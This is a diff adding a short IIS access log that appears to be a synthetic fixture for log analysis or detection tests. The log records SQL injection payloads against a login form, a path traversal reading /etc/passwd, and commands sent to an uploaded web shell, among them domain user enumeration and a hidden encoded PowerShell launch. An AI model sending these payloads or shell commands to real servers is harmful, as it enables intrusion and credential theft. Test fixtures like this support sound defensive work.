@@ -1,0 +1,14 @@
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2025-03-15 10:00:00
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-bytes
+2025-03-15 10:00:01 10.0.0.10 GET / - 443 - 192.168.1.100 Mozilla/5.0 200 5120
+2025-03-15 10:00:02 10.0.0.10 GET /admin - 443 - 198.51.100.10 sqlmap/1.7 403 1024
+2025-03-15 10:00:03 10.0.0.10 POST /login user=admin'%20OR%201=1-- 443 - 198.51.100.10 sqlmap/1.7 500 2048
+2025-03-15 10:00:04 10.0.0.10 POST /login user=admin'%20UNION%20SELECT%20password%20FROM%20users-- 443 - 198.51.100.10 sqlmap/1.7 500 4096
+2025-03-15 10:00:05 10.0.0.10 GET /download file=../../../../etc/passwd 443 - 198.51.100.10 Mozilla/5.0 200 2048
+2025-03-15 10:00:06 10.0.0.10 GET /uploads/cmd.aspx cmd=whoami 443 - 203.0.113.45 curl/7.88 200 64
+2025-03-15 10:00:07 10.0.0.10 GET /uploads/cmd.aspx cmd=ipconfig 443 - 203.0.113.45 curl/7.88 200 256
+2025-03-15 10:00:08 10.0.0.10 GET /uploads/cmd.aspx cmd=net+user+/domain 443 - 203.0.113.45 curl/7.88 200 4096
+2025-03-15 10:00:09 10.0.0.10 POST /uploads/cmd.aspx cmd=powershell+-nop+-w+hidden+-enc+SQBFAFgA 443 - 203.0.113.45 curl/7.88 200 128
+2025-03-15 10:00:10 10.0.0.10 GET /api/debug - 443 - 198.51.100.10 Mozilla/5.0 500 8192
